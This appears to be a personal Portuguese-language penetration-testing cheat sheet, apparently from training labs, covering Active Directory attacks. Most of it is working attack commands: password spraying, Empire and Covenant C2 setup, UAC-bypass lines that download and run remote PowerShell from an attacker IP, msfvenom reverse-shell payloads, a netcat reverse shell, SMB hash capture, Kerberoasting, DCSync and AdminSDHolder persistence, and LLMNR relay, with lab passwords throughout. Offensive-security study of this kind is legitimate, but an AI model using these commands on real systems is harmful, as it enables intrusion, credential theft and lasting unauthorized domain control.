# Fundamentos de envio de e-mail - PTX  
	#Verificar a SPF - Sender Policy Framework 
		dig +short TXT microsoft.com 
	#Verificar chave Pública de um mail server - DKIM 
		dig selector._domainkey.domain.com TXT
		dig dkim._domainkey.twitter.com TXT
	#Verificar DMARC 
		dig +short TXT _dmarc.wordpress.com
		dig +short TXT _dmarc.DOMAIN.com

# Verificar associações de arquivo no Windows 
	assoc
	assoc | findstr /i "word"
	assoc | findstr /i "excel"
	assoc | findstr /i "powerp"

# Reconhecimento
	## Network Scan 
   		sudo nmap -n -sn 10.100.10.0/24 -oX - | uphosts -oX

    dig google.com +short 
    whois google.com
    dnscan.py -d google.com -w subdomains-100.txt #https://github.com/rbsec/dnscan
    amasss enum -active -d google.com -v -o google.com
	# Dns Reverso com nmap - Comando para listar ips 
		sudo nmap -sL 10.50.96.0/24

# Cenário de Phishing
    #Spoofcheck - Verificas se o dominío pode ser spoofado para phishing
    python spoofcheck.py mail.google.com
    # Password Spraying 
    ./atomizer.py owa target.exemplo.com <SenhaDificil> /tmp/user.txt

# Scanear a rede com modulo smb_version procurando por máquinas windows 
	>> use auxiliary/scanner/smb/smb_version

# Scanear por SNMP login 
	>> use auxiliary/scanner/snmp/snmp_login
	#De posse do comunity name 
	snmpcheck.pl -c COMMUNITY_STRING -t IP 

# Rpcclient para enumerar usuarios do dominio
	cat ips.txt | while read line
	do
		echo $line && rpcclient -U "ELS\Usuario%Senha" -c "enumdomusers;quit" $line
	done

# RDP 
	## Password Spraying em RDP 
		python3 RDPassSpray.py -u victim -p Summer2020! -d ELS-CHILD -t 10.100.10.240:65520
	## RDP 
		rdesktop 10.100.10.240:65520 -g 100% -u victim -p 'Summer2020!' -d ELS-CHILD 
		xfreerdp /u:analyst1 /d:els.bank /p:'P@ssw0rd123' /v:172.16.80.100

#### Comando e Controle #### 
	## Empire - Está dando erro se excutado fora da pasta, devem haver trechos do script com Path relativo 
		sudo ./install.sh #na pasta setup 
		sudo ./empire
		# 1 - Criar o Listener
			listeners
			uselistener http
			set BindIP 175.12.80.10
			set Host http://175.12.80.10:81
			set Port 81
		# 2 - Criar o Launcher
			launcher powershell
		# 2 - ou por stagger
			back 
			usestagger windows/launcher_bat
			set Listener http
		# Observação: Com CLM habilitado na Máquina, para usar o empire foi necessário 
			# 1 - pegar o comando encodado e desencodar
			# 2 - Hospedar em formato ps1 
			iex (New-Object Net.WebClient).DownloadString('http://175.12.80.10:8081/rev.ps1') 
		# 3 - Agentes
			agents 
			interact <AGENT> 
	

	## Covenant - C2 - https://www.sevenlayers.com/index.php/370-covenant-c2-deep-dive
		git clone --recurse-submodules https://github.com/cobbr/Covenant
		cd Covenant/Covenant 
		sudo docker build -t covenant .
		sudo docker run -it -p 7443:7443 -p 80:80 -p 443:443 --name covenant -v `pwd`/Data:/app/Data covenant 
		#Remover o docker para voltar a utilizar
		sudo docker ps -a
		sudo docker rm covenant
		http://127.0.0.1:7443/
		# 1 - Criar um Listener 
		# 2 - Criar um Launcher - para cada listener
			Escolher e clicar em Host para hospedar o launcher 
		# 3 - Ver vítimas em Grunts 
			SharpUp audit
			BypassUACCommand /command:"cmd.exe" /parameters:"/c powershell -Sta -Nop -Window Hidden -Command \"iex (New-Object Net.WebClient).DownloadString('http://175.12.80.10/lab2.ps1')\"" /directory:"" /processid:"0"
			BypassUACCommand /command:"powershell.exe" /parameters:"-Sta -Nop -Window Hidden -Command \"rundll32 ps.dll,main iex (New-Object Net.WebClient).DownloadString('http://175.12.80.10/lab2.ps1')\"" /directory:"" /processid:"2008"

			SharpShell /code:"var startInfo = new System.Diagnostics.ProcessStartInfo { FileName = @\"C:\Windows\System32\Taskmgr.exe\", WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden }; var cmd1 = new System.Diagnostics.Process { StartInfo = startInfo }; cmd1.Start(); return cmd1.Id.ToString();"
		
			# Bypass UAC com psexec 
				PSExec.exe -i -s cmd 
		#Personificar Usuário
			MakeToken /username:"analyst1" /domain:"ELS-CHILD" /password:"a1@3L$-CHILDL0c@l" /logontype:"LOGON32_LOGON_NEW_CREDENTIALS"

		#Importar powershell 
			Task - PowershellImport 
			# PowerView após importado pelo PowerShellImport 
				powershell get-domain #Depois de importar Powerview por exemplo
				powershell find-localadminaccess 
				powershell get-netsession #Dessa forma verificará de maneira local as sessões ativas
				powershell get-netsession -ComputerName NOME_COMPUTADOR
				Powershell get-domaincontroller | get-netssession # Verifica sessões em todos os DC 
				powershell get-netloggedon # Usuários ativos logados no localhost 
				powershell get-netloggedon -ComputerName NOME_COMPUTADOR
				# Encontrar compartilhamentos acessíveis 
					powershell invoke-sharefinder
					powershell invoke-sharefinder -ExcludeStandard -ExcludePrint -ExcludeIPC -Verbose
				
				powershell get-NetGPOGroup -Verbose
				powershell Get-NetOU # Lista todos os Organizational Units 
				powershell Get-NetGPO 
				powershell get-netuser # Lista usuários 
				powershell get-netuser | select samaccountname 
				powershell get-netcomputer # lista computadores 
				powershell get-netcomputer | select samaccountname,distinguishedname
				#enumerar grupos
					powershell get-netgroup -groupname "Domain Admins" -FullData 
					powershell get-netgroupmember -GroupName "Domain Admins" -FullData
					
			# Rubeus 
				Rubeus /command:"triage"
				Rubeus /command:"klist"

			# Metasploit 
				msfvenom --platform Windows -p windows/meterpreter/reverse_tcp lhost=175.12.80.10 lport=4444 -f raw -o test.bin
				xxd -ps test.bin | tr -d "\n"

				python3 ./MsfMania.py -it local -a x64 -j -s 2 -p windows/meterpreter/reverse_tcp_rc4 -lh 175.12.80.10 -lp 4443 -o mania1
				for i in `seq 1 20`; do python3 ./MsfMania.py -it local -a x64 -j -s 60 -p windows/x64/meterpreter/reverse_tcp -lh 175.12.80.10 -lp 443 -o ab_$i; done
				#Covenant shell code 

# Video Aula 1 Comandos interessantes
	# Linux em AD 
	# Reverser shell - Ubuntu que não conhecia 
		mknod /tmp/backpipe p 
		/bin/sh 0</tmp/backpipe | nc 10.10.10.101 443 1> /tmp/backpipe
	# Linux em AD  
		# Modo silencioso de verificar o DC name
			cat /etc/krb5.conf
		# Se for Samba 3 poderá constar senha em claro no secrets.tdp
			tdbdump /var/lib/samba/private/secrets.tdb
		# Requisitar Kerberos Tockets
			kinit ubuntu@ELS.LOCAL
		# Listar kerberos tickets
			klist
		# Usar smbclient aliado com  o ticket obitido para se acessar compartilhamento 
			smbclient -k -L //user8.els.local
		# Rpcclient no AD com o ticket obtido para se obter lista de usuários 
			rpcclient -k lab-dc01.els.local

	############ Interessante ############
	# Ataque de MITM com msfconsole e bettercap 
		 # Capture SMB
		 	use auxiliary/server/capture/smb
			set JOHNPWFILE netntlm_hashes
			run
		# Bettercap com proxy incluindo no img de compartilhamento para capturar hash
			bettercap --proxy --proxy-port 8081 --proxy-module injecthtml --html-data "<img src='file://10.10.10.101/qualquercoisa.png'>" -T 10.10.10.103
	############ ############ ############

	# Wmiexec - para testar se o usuário é admistrador
		python wmiexec.py ELS/testuser:P@ssw0rd@10.10.10.103 -dc-ip 10.10.10.254
	# Empire + Web Delivery
		# Empire 
			powershell/code_execution/invoke_metasploitpayload
			set URL urldoWebDelivery
		#Metasploit 
			use exploit/multi/script/web_delivery
	# Empire comandos usados no video 
		# Identificar os Administradores de Dominio
			usemodule situational_awareness/network/powerview/get_group_member
			options 
			run
		#Procurar por falhas de configuracao de ACL , mais precisamente por quem pode resetar senha dos outros
			usemodule situational_awareness/network/powerview/get_object_acl
			set SamAccountName testuser
			set RightsFilter ResetPassword
			run
		#Encontrar algum usuário 
			usemodule situational_awareness/network/powerview/user_hunter
			set UserName testuser
			run
	# Powershell + Powerview - Abusando do Reset Password 
		$UserPassword=ConvertTo-SecureString 'P@ssword1234' -AsPlainText -Force 

		#Baixar PowerView
		IEX(New-Object -New-Webclient).DownloadString('http://10.10.10.10./Powerview.ps1') 
		Set-DomainUserPassword -Identity Administrator -AccountPassword $UserPassword

# Enumerando rede 
	# Enumerando rede com nslookup no windows prompt 
		for /L %i in (1,1,255) do @nslookup 10.10.10.%i [server to resolve from] 2>nul | find "Name" && echo 10.10.10.%i
		for /L %i in (1,1,255) do @nbtstat -A 10.10.10.%i 2>nul && echo 10.10.10.%i
	# Enumerando rede com powershell - DNS over LDAP 
		get-adcomputer –filter * -Properties ipv4address | where {$_.IPV4address} | select name,ipv4address
		#or
		get-adcomputer -filter {ipv4address -eq 'IP'} -Properties Lastlogondate,passwordlastset,ipv4address

		# No próprio domínio 
		Get-ADComputer -Filter * -properties * | select DNSHostName,DistinguishedName,SamAccountName
		# Usando ou DC - no caso de Florestas 
		Get-ADComputer -Filter * -properties * -Server dc02.dev.final.com| select DNSHostName,DistinguishedName,SamAccountName


# Encontrando o DC 
	# nslookup 
		nslookup -querytype=SRV _LDAP._TCP.DC._MSDCS.domain_name
	# Powershell 
		[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers
	# Prompt Windows
		net view /domain
		net view /domain:domain_name
		nltest /server:ip_of_any_member /dclist:domain_name
	
# Como usuário válido buscar por compartilhamentos que se acesso 
	net use e: \\ip\ipc$ password /user:domain\username
	net view \\IP

## Versao do .NET
    powershell Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP' -Recurse | Get-ItemProperty -Name version -EA 0 | Where { $_.PSChildName -Match '^(?!S)\p{L}'} | Select PSChildName, version

# Encontrar usuários logados 
	# WMI 
		Get-WMIObject -class Win32_ComputerSystem -ComputerName 192.168.1.9 | Select-Object UserName
	# PSLoggedOn - Ferramenta do Sysinternals 
		psloggedon.exe Chris
	# Netsess - Ferramenta externa que nao precisa de privilégios de Adm - https://www.joeware.net/freetools/tools/netsess/index.htm
		netsess.exe \\Server_Name
	# PVEFindADUser - Ferramenta do Corelan - https://www.corelan.be/index.php/my-free-tools/ad-cs/pve-find-ad-user/
		PVEfindADuser.exe -current 
	# Nettview 
		netview.exe -d 
	# Nmap 
		nmap -sU -sS --script smb-enum-session.nse --script-args "smbuser=fulano,smbpass=senhadofulano" -p U:137,T:139 192.168.0.0/24

# Enumerar serviço sem necessidade de um portscan com SPN 
	Get-ADComputer -filter {ServicePrincipalName -Like "*SPN*" } -Properties OperatingSystem,OperatingSystemVersion,OperatingSystemServicePack,PasswordLastSet,LastL ogonDate,ServicePrincipalName,TrustedForDelegation,TrustedtoAuthForDelegation
	#Ou com ferramenta automatizada no git Find-PSserviceAccounts - https://github.com/PyroTek3/PowerShell-AD-Recon/blob/master/Find-PSServiceAccounts

## GPO 
	# Enumerar Políticas de Grupo GPO 
		Get-NetGPO | select displayname,name,whenchanged
	# GPO Abuse 
		powershell Get-NetGPO | select displayname 
		powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} 

		#Escola => SharpGPOAbuse para automatizar o processo de abusar de GPO  
			# 1 - Será necessário compliar uma DLL 
			# 2 - Intalar o Nuget no Visual Studio 
				Install-Package ilmerge -Version 3.0.29
			# 3 - Dar um merge na Dll e no Exe
				ILMerge.exe /out:SharpGPOAbuseMerged.exe .\SharpGPOAbuse.exe .\CommandLine.dll
			
		# Metasploit - https://github.com/b4rtik/metasploit-execute-assembly
			# 1 - Compilar a Dll como x64 -  HostingCLRx64.dll
			# 2 - copiar o módulo e a Dll para o metasploit 
				mkdir -p $home/.msf4/modules/post/windows/manage
				mv execute-assembly.rb $home/.msf4/modules/post/windows/manage/execute_assembly.rb
				cp hostingclrx64.dll /usr/share/metasploit- framework/data/post/hostingclrx64.dll
			# 3 - É módulo de pós exploração, logo ele espera uma sessão 
				msf5 post(windows/manage/execute_assembly) > set session 1
				msf5 post(windows/manage/execute_assembly) > set assembly Launcher.exe #Launcher para novo Grunt do Covenant por exemplo 
				msf5 post(windows/manage/execute_assembly) > set arguments "-h"
				msf5 post(windows/manage/execute_assembly) > set assemblypath /root/
				msf5 post(windows/manage/execute_assembly) > run

		# Modificar o https://github.com/ZeroPointSecurity/SharpGPOAbuse para subir com o task de assembly para executar o .NET em memória 

# PowerView 
	# Verificar Usuários do Domain Admin
		powershell "IEX (New-Object New.WebCLient).DownloadString('http://IP_ATTACANTE/PowerView.ps1'); Get-NetGroupMember 'Domain Admins' -Recurse"
		powershell "IEX (New-Object New.WebCLient).DownloadString('http://192.168.119.205/PowerView.ps1');  Get-NetGroupMember -GroupName 'Domain Admins' -FullData | %{ $a=$_.displayname.split(' ')[0..1] -join ' '; Get-NetUser -Filter '(displayname=*$a*)' } | Select-Object -Property displayname,samaccountname"
		#AdminCount = 1 
		powershell "IEX (New-Object New.WebCLient).DownloadString('http://IP_ATTACANTE/PowerView.ps1'); Get-NetUser –AdminCount | select name,whencreated,pwdlastset,lastlogon"
		# Através de GPO 
			#Encontra os computadores onde esse usuário tem privilégios
				Find-GPOLocation -UserName username 
				Find-GPOLocation -UserName username -LocalGroup RDP
			#Dado um computador, encontra nele usuários com privilégios
				Find-GPOComputerAdmin -ComputerName computer_name

	# User Hunter - Encontrar usuários logados
		powershell "IEX (New-Object New.WebCLient).DownloadString('http://IP_ATTACANTE/PowerView.ps1'); Invoke-UserHunter -Stealth -ShowAll"

	# Identificar DC através de privilégios de Admin Local 
		Get-NetGPOGroup
		Get-NetGroupMember -GroupName "Local Admin"
		Get-NetOU
		Find-GPOComputerAdmin –OUName 'OU=X,OU=Y,DC=Z,DC=W'
		Get-NetComputer –ADSpath 'OU=X,OU=Y,DC=Z,DC=W'
	
	#Encontrar o DC 
		Get-NetDomainControllers

	## Unscontrained Delegation - Pass-The-ticket ## 
		# Identificar Computadores com delegação irrestrita 
			Get-DomainComputer -Unconstrained 
		#Identificar usuário nao protegtidos contra a delegacao 
			Get-DomainUser -AllowDelegation -AdminCount
		

	# Usuários Comuns com privilégios de Admin
		Get-NetGroup "*admins*" | Get-NetGroupMember –Recurse | ?{Get-NetUser $_.MemberName –filter '(mail=*)'}
		Get-NetGroup "*admins*" | Get-NetGroupMember –Recurse | ?{$_.MemberName –Like '*.*'}

	# Administradores de Plataforma de virtualização
		Get-NetGroup "*Hyper*" | Get-NetGroupMember and
		Get-NetGroup "*VMWare*" | Get-NetGroupMember

	# Identificando Computadores com privilégio no grupo de Administradores 
		Get-NetGroup "*admins*" | Get-NetGroupMember –Recurse |?{$_.MemberName –Like '*$'}
	
	# Enumerar grupos de uma máquina
		#Enumera os grupos
		Get-NetLocalGroup -ComputerName computer_name -ListGroups
		#Enumera usuários de um grupo
		Get-NetLocalGroup -ComputerName computer_name -GroupName "Remote Desktop Users" -Recurse
		#Grupos que são administradores locais de um AD
		Get-NetDomainController | Get-NetLocalGroup -Recurse

	# Encontrar delegação
		Invoke-ACLScanner –ResolveGUIDs –ADSpath 'OU=X,OU=Y,DC=Z,DC=W' | Where {$_.ActiveDirectoryRights -eq 'GenericAll'}
	
	# Encontrar usuários que podem acessar senhas em claro no LAPS 
		Get-NetComputer -ComputerName 'computer_name' -FullData | Select-Object -ExpandProperty distinguishedname |
		ForEach-Object { $_.substring($_.indexof('OU')) } | ForEach-Object {
		Get-ObjectAcl -ResolveGUIDs -DistinguishedName $_ } | Where-Object {
		($_.ObjectType -like 'ms-Mcs-AdmPwd') -and
		($_.ActiveDirectoryRights -match 'ReadProperty') } | ForEach-Object {
		Convert-NameToSid $_.IdentityReference
		} | Select-Object -ExpandProperty SID | Get-ADObject

		# Verificar ACLs para encontrar usuários com esse tipo de privilégio 
			Get-NetOU -FullData | Get-ObjectAcl -ResolveGUIDs | Where-Object {
			($_.ObjectType -like 'ms-Mcs-AdmPwd') -and
			($_.ActiveDirectoryRights -match 'ReadProperty') } | ForEach-Object {
			$_ | Add-Member NoteProperty 'IdentitySID' $(Convert-NameToSid $_.IdentityReference).SID;
			$_ }

	# Forest 
		Get-NetForest
		Get-NetDomain
		
		#Descobrir onde está o PDC Emulator - PDCRoleOwner
		>> Get-ADForest |
		>> Select-Object -ExpandProperty RootDomain | 
		>> Get-ADDomain |
		>> Select-Object -Property PDCEmulator

		#Enumerar todos os domínios de uma forest
		Get-NetForestDomain

		#Enumerar todos os domain trusts
		Get-NetUser -Domain associated_domain

		#Encontrar todos os grupos associados a um trust
		Get-NetGroup *admin* -Domain associated_domain

		#Mapear todos os domínios alcançáveis
		Invoke-MapDomainTrust
		Invoke-MapDomainTrust -LDAP
		Invoke-MapDomainTrust | Export-Csv -NoTypeInformation trusts.csv

		#informações de confiança
		Get-NetDomainTrust

		#Encontrar usuários externos com relação de confiança
		Find-ForeignUser
		
		#Grupo em domínio externo que não incluem usuários do domínio alvo
		Find-ForeignGroup -Domain els.local

# Identificando contatos 
	get-ADObject -filter {ObjectClass -eq "Contact"} –Prop *

# ACL - Access Control List 
	## PEN300 
		# Enumera ACls de um dado usuário - como objeto (ou seja, encontra acl que afetem determinado usuário especificado)
		..\powerview.ps1
		Get-ObjectACL -ResolveGUIDs -SamAccountName SamAccountName
		Get-ObjectAcl -Identity offsec
		Get-ObjectAcl -Identity offsec -ResolveGUIDs | Foreach-Object {$_ | Add- Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_}
		# Verificar quais ACL o current user tem acesso (Usuários e grupos)
		Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add- Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
		Get-DomainGroup | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add- Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
			#GenericAll 
				Usuário - Mude a senha 
				Grupo - Se inclua nele 
				# 1 - Mudar a senha do alvo
				net user usuario n
				ShellRunAs /shellcommand:"whoami" /username:"usuario" /domain:"ELS-CHILD" /password:"Admin@123"
				# 2 - Criar um SPN para realizar kerberoasting e quebrar senha offline
				powershell setspn.exe -a HTPP/jumpbox els-child\usuario_alvo
				rubeus kerberoast /format:hashcat
				hashcat -m 13100 krb.txt wordlist.txt 

				# 3 - Habilitar o PreAuthNotRequired para realizar ASREPROASTING 
				powershell Set-DomainObject -Identity analystm2 -XOR @{useraccountcontrol=4194304} -Verbose 
				powershell Get-DomainUser -PreauthNotRequired -Verbose -Identity analystm2
				rubeus asreproast /format:hashcat 
				hashcat -m 18200 asrep.txt wordlist.txt
				#WriteDACL - Crie DACL com GenericAll para seu usuário ter controle sobre o objeto - PowerView 
				Add-DomainObjectACL -TargetIdentity objeto_usuario_ou_grupo -PrincipalIdentity o_usuario -Rights All 
	
	#Verificar ACL se o usuário tem algum privilégio sobre o AdminELS 
    Get-ObjectAcl -ResolveGUIDs -SAMAccountName AdminELS
    Get-ObjectAcl -SamAccountName AdminELS -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq "GenericAll"}  

	## ACL - Covnant + Powerview + Runas 
		PowershellImport PowerView.ps1
		powershell Invoke-AclScanner | select ObjectDN,ActiveDirectoryRights,IdentityReference
		powershell Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName match "Analyst1"} #Verifica atributos que são controlados por analyst1 

    # Verificar ACL que privilegiem um usuário sobre o outro - Propriedades de service_user2 que analyst1 tem acesso 
        powershell Get-ObjectAcl -SamAccountName service_user2 -ResolveGUIDs | ? {$_.IdentityReference -eq "ELS-CHILD\analyst1"}

	# Persistencia - Concede a conta 1 os direitos de resetar a senha da conta 2 
	Add-ObjectACL -TargetSamAccountName SamAccountName2 -PrincipalSamAccountName SamAccountName1 -Rights ResetPassword

	# Concede permissão AdminSDHolder
	Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName SamAccountName1 -Verbose -Rights All

	#Verificar direitos de AdminSDHolder
	Get-ObjectAcl -ADSprefix 'CN=AdminSDHolder,CN=System' -ResolveGUIDs | ?{$_.IdentityReference -match 'SamAccountName1'}

	# Persistencia para ter os direitos de DCSync, podendo replicar qualquer hash do DC.
	Add-ObjectACL -TargetDistinguishedName "dc=els,dc=local" -PrincipalSamAccountName SamAccountName1 -Rights DCSync

	#Verificar DCSync
	Get-ObjectACL -DistinguishedName "dc=els,dc=local" -ResolveGUIDs | ? { ($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') }

	# Verificar as perimissões de GPO que você tem acesso
	Get-NetGPO | ForEach-Object {Get-ObjectAcl -ResolveGUIDs -Name $_.name} | Where- Object {$_.ActiveDirectoryRights -match 'WriteProperty'}

	#Verificar por ACL não padrão
	Invoke-ACLScanner

# Extraindo informações de usuários
	Get-ADUser username -Properties * | Select Description
	Get-NetUser –AdminCount 
	Get-NetUser –SPN

# Extraindo informações de computador 
	Get-ADComputer -Filter * -Property property
	Get-ADComputer -Filter * -Property PrimaryGroupID
	Get-ADComputer -Filter 'OperatingSystemVersion -eq "6.3 (9600)"'
	Get-NetComputer -SPN mssql*
	Get-ADComputer -filter {PrimaryGroupID -eq "515"} -Properties OperatingSystem,OperatingSystemVersion,OperatingSystemServicePack,PasswordLastSet,LastL ogonDate,ServicePrincipalName,TrustedForDelegation,TrustedtoAuthForDelegation

# Enumerar Administrador Local 
	([ADSI]'WinNT://computer_name/Administrators').psbase.Invoke('Members') | %{$_.GetType().InvokeMember('Name', 'GetProperty', $null, $_, $null)}
	Get-NetLocalGroup -ComputerName computer_name
	Get-NetLocalGroup -ComputerName computer_name -API
	Get-NetLocalGroup -ComputerName computer_name -Recurse

# Enumerar contas de Domain Admins 
	Get-NetGroupMember –GroupName "Domain Admins"
	Get-NetGroupMember –GroupName "Denied RODC Password Replication Group" -Recurse

# Objetos deletados 
	>> Import-Module .\DisplayDeletedADObjects.psm1 
	>> Get-OSCDeletedADObjects

# Política de senha	
	Get-ADDefaultDomainPasswordPolicy

# Wmic 
	wmic alias list brief -> Be familiar with the aliases 
	wmic computersystem list full -> Information about the OS
	wmic volume list brief -> Available volumes
	wmic /namespace:\\root\securitycenter2 path antivirusproduct GET displayName, productState, pathToSignedProductExe -> List Antivirus.
	wmic qfe list brief -> List Updates
	wmic DATAFILE where "drive='C:' AND Name like '%password%'" GET Name,readable,size /VALUE -> Search files containing ‘password’ in the name.
	wmic useraccount list -> Get local user accounts
	wmic NTDOMAIN GET DomainControllerAddress,DomainName,Roles -> Domain DC and Information
	wmic /NAMESPACE:\\root\directory\ldap PATH ds_user GET ds_samaccountname -> List all users
	wmic /NAMESPACE:\\root\directory\ldap PATH ds_group GET ds_samaccountname -> Get all groups
	wmic path win32_groupuser where (groupcomponent="win32_group.name='domain admins',domain='YOURDOMAINHERE'") -> Members of Domain Admins Group
	wmic /NAMESPACE:\\root\directory\ldap PATH ds_computer GET ds_samaccountname -> List all computers
	Get-WmiObject -Namespace root\SecurityCenter2 -Class AntiVirusProduct-> Antivirus product
	[Bool](Get-WmiObject -Class Win32_ComputerSystem -Filter "NumberOfLogicalProcessors < 2 OR TotalPhysicalMemory < 2147483648") - > Virtual Machine Detection
	Get-WmiObject -Query "select * from Win32_Product" | ?{$_.Vendor - notmatch 'Microsoft'} -> Check .MSI installations not from Microsoft.
	Get-WmiObject -Query "select * from Win32_LoggedOnUser" | ?{$_.LogonType -notmatch '(Service|Network|System)'} -> Logged on users.

# POWERSHELL 
	#Identificar qual PowerShell engine 
	reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PowerShell\1\Powe rshellEngine /v PowershellVersion
	reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PowerShell\3\Powe rshellEngine /v PowershellVersion
	Get-ItemPropertyValue HKLM:\SOFTWARE\Microsoft\PowerShell\*\PowerShellEngine -Name PowerShellVersion

	#Identificar o Powershell logging
	reg query HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Policies\Micros oft\Windows\PowerShell\Transcription
	regquery HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Policies\Micros oft\Windows\PowerShell\ModuleLogging
	regquery HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Policies\Micros oft\Windows\PowerShell\ScriptBlockLogging

	#Common Language Runtime
	dir %WINDIR%\Microsoft.Net\Framework\ /s /b | find "System.dll"
	[System.IO.File]::Exists("$env:windir\Microsoft.Net\Framework\v2.0.50727\System.dll")
	[System.IO.File]::Exists("$env:windir\Microsoft.Net\Framework\v4.0.30319\Syste m.dll")

## BloodHound
    sudo neo4j console
    .\BloodHound
    ## SharpHound
        iex (New-Object Net.WebClient).DownloadString('http://175.12.80.10:8081/SharpHound.ps1'); Invoke-BloodHound -CollectionMethod All
        .\SharpHound.exe --CollectionMethod All
        --CollectionMethod All --Throttle 1500 --Jitter 10 --CompressData --RemoveCSV and --NoSaveCache
        Invoke-BloodHound -CollectionMethod All
        Invoke-BloodHound -CollectionMethod Acl,ObjectProps
        Invoke-BloodHound -Throttle 1500 -Jitter 10 #Throttle é a pausa entre requisições e jitter é a variação em porcentagem 
        Invoke-BloodHound -CompressData -RemoveCSV and -NoSaveCache
        Invoke-BloodHound -CollectionMethod All -Throttle 1500 -Jitter 10 -CompressData -RemoveCSV and -NoSaveCache
    ## Executar SharpHound via rede - Não depende do Windows, mas também não retorna tudo 
        pip3 install bloodhound
        bloodhound-python -u support -p '#00^BlackKnight' -ns 10.10.10.192 -d blackfield.local -c all
	## BloodHound Cypher Queries
		#Some query examples to start with in Neo4j Browser:
			#Return OU Names
			MATCH (O:OU) RETURN O.name
			#Return Group Names
			MATCH (G:Group) RETURN G.name
			#Return Domain Admin’s account names
			MATCH (U:User)-[:MemberOf]-(G:Group {name:"DOMAIN ADMINS@ELS.LOCAL"}) RETURN U.name
			#Return Users with SPN Associated
			MATCH (U:User) WHERE exists (U.hasspn) RETURN U.name
			#Return Groups containing a Keyword
			MATCH (G:Group) WHERE G.name=~'(?i).*ADMIN.*' RETURN G.name
			#Return Computers containing “DC” in the name
			MATCH (C:Computer) WHERE C.name CONTAINS "DC" RETURN C
			#Return user names belonging to a group containing the keyword ‘ADMIN’ with a maximum degree of 2
			MATCH (U:User)-[R:MemberOf*1..2]-(G:Group) WHERE G.name CONTAINS 'ADMIN' RETURN U.name

			#Return all users that are administrator on more than one machine
			MATCH (U:User)-[r:MemberOf|:AdminTo*1..]->(C:Computer) WITH U.name as n, COUNT(DISTINCT(C)) as c WHERE c>1 RETURN n ORDER BY c DESC
			#Return a list of users who have admin rights on at least one system either explicitly or through group membership
			MATCH (u:User)-[r:AdminTo|MemberOf*1..]->(c:Computer) RETURN u.name
			#Return cross domain 'HasSession' relationships
			MATCH p=((S:Computer)-[r:HasSession*1]->(T:User)) WHERE NOT S.domain = T.domain RETURN p
			#Return Users with additional permissions.
			MATCH p=(m:Group)- >[r:Owns|:WriteDacl|:GenericAll|:WriteOwner|:ExecuteDCOM|:GenericWrite|:AllowedToDelegate|:ForceChangePassword]->(n:Computer) WHERE m.name STARTS WITH ”DOMAIN USERS” RETURN p
			#Return non Domain Controller Machines with Domain Admin Sessions
			OPTIONAL MATCH (C:Computer)-[:MemberOf]->(G:Group) WHERE NOT G.name = "DOMAIN CONTROLLERS@ELS.LOCAL" WITH C as NonDC
			MATCH P=(NonDC)-[:HasSession]->(U:User)-[:MemberOf]-> (G:Group {name:"DOMAIN ADMINS@ELS.LOCAL"})
			RETURN U.name, NonDC.name

			#Return top 10 users with most Derivative local admin rights
			MATCH (u:User)
			OPTIONAL MATCH (u)-[:AdminTo]->(c1:Computer)
			OPTIONAL MATCH (u)-[:MemberOf*1..]->(:Group)-[:AdminTo]->(c2:Computer) WITH COLLECT(c1) + COLLECT(c2) as tempVar,u
			UNWIND tempVar AS computers
			RETURN u.name,COUNT(DISTINCT(computers)) AS is_admin_on_this_many_boxes ORDER BY is_admin_on_this_many_boxes DESC
			#Parentage of users with path to DA
			OPTIONAL MATCH p=shortestPath((u:User)-[*1..]-> (m:Group {name: "DOMAIN ADMINS@TESTLAB.LOCAL"})) OPTIONAL MATCH (uT:User) WITH COUNT (DISTINCT(uT)) as uTotal, COUNT (DISTINCT(u)) as uHasPath RETURN uHasPath / uTotal * 100 as Percent


# Video 2 - Roubo de Ticket para acessar servidores web do domínio 
	# Get-BrowserData.ps1 - https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/master/Get-BrowserData.ps1
	# Enumera Bookmarks e histórico
		Get-BroserData | Format-List

	#GSSAPI/Kerberos Proxy - Precisa de usuário privilegiado 
		# https://github.com/mikkolehtisalo/gssapi-proxy
		# Abre um proxy no alvo para ser usado pelo atacante para acessar páginas usando seu tecket do Kerberos 
			# O CARA DO VIDEO FEZ A OPÇÃO PELA VERSÃO EM EXE POIS DISSE QUE A VERSAO POWERSHELL DO DOWNLOAD.STRING NAO ERA ESTÁVEL O BASTANTE 
			portfwd add -r IP_ALVO -l 4444 -p 8080
			gssapi-proxy.exe 
			#Acessar o proxy na nossa porta local 4444

# Ldap Relay + MiTM 
	sudo wine Intercepter-NG.exe

# Ataque de LLMNR/NBT-NS Poisoning ++
	# Maquina alvo deve ter o Signing False
	python RunFinger.py -i IP

	# Ataque em conjunto com a ferramenta SNARF - que faz um relay daquele usuário fazendo com que o socket localhost:445 seja o espelho da 445 do alvo autenticado como o usuario alvo 

	# Responder.conf e mudar para “SMB = Off.”
	# Rodar o Snarf - e na interface gráfica colocar o alvo 
	node snarf.js attacking_machine_IP
	sudo iptables -t nat -A PREROUTING -p tcp --dport 445 -j SNARF

	# Snarf disponível em - http://localhost:4001/

	# Rodar o responder 
	python Responder.py –I eth0
	# Snarf vai capturar uma conecção SMB e então devemos clicar em choose 
